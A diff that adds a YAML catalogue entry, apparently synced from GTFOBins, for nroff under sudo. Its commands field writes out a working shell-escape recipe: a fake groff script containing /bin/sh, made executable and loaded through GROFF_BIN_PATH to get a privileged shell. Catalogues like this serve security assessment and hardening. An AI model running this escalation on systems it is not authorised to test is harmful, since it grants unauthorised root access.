@@ -1,0 +1,28 @@
+id: gtfobins/nroff/shell/sudo
+type: binary
+platform: linux
+name: nroff
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo /bin/sh >groff
+
+    chmod +x groff
+
+    GROFF_BIN_PATH=. nroff'
+references:
+- https://gtfobins.github.io/gtfobins/nroff/
+tags:
+- linux
+- unix
+- gtfobins
